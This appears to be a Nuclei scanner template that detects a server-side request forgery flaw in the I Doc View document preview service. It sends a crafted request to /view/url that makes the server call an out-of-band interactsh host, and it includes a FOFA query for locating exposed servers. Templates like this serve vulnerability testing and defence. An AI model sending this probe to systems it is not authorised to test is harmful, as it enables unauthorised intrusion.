id: idocview-view-url-ssrf

info:
  name: idocview url - ssrf
  author: leadlife
  severity: high
  metadata:
    verified: true
    fofa-query: title=="在线文档预览 - I Doc View"
  tags: idocview,ssrf,oob


http:
  - raw:
      - |
        GET /view/url?url=http://{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or